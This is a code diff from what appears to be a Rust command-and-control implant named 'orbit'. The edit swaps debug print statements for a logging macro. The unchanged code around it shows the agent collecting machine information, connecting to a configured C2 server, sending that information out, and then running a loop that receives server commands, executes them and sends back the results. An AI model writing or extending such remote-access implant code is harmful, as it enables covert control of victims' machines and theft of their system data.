@@ -1,6 +1,7 @@
 pub mod actions;
 pub mod agent;
 pub mod config;
+pub mod debug;
 pub mod utils;
 pub mod sockets;
 
@@ -27,20 +28,17 @@ pub fn run() -> Result<(), Box<dyn Error>> {
     let agent_info = Info::collect();
     let agent_info = agent_info.as_string();
 
-    #[cfg(debug_assertions)]
-    println!("Gathered Machine's Info:\n{}", agent_info);
+    orbit_debug!("Gathered Machine's Info:\n{}", agent_info);
 
     // create a session with C2 server and send initial data
     let mut server_stream = ServerStream::new(config::server::IP, config::server::PORT)?;
     server_stream.send(agent_info)?;
 
-    #[cfg(debug_assertions)]
-    println!("Connected to C2 Server!");
+    orbit_debug!("Connected to C2 Server!");
 
     // starting the main C&C loop
     loop {
-        #[cfg(debug_assertions)]
-        println!("Waiting for a command from the server...");
+        orbit_debug!("Waiting for a command from the server...");
         
         // get a command from the server
         let (server_command, command_size) = server_stream.receive()?;
@@ -49,15 +47,13 @@ pub fn run() -> Result<(), Box<dyn Error>> {
         let server_command = server_command.get(..command_size).unwrap();
         let server_command = String::from_utf8(server_command.to_vec())?;
 
-        #[cfg(debug_assertions)]
-        println!("Server Command: {}", server_command);
+        orbit_debug!("Server Command: {}", server_command);
 
         // build the command object and execute it
         let command = Command::from_server(server_command);
         let result = command.execute()?;
 
-        #[cfg(debug_assertions)]
-        println!("Command Executed");
+        orbit_debug!("Command Executed");
 
         // send result back to the server
         server_stream.send(result)?;
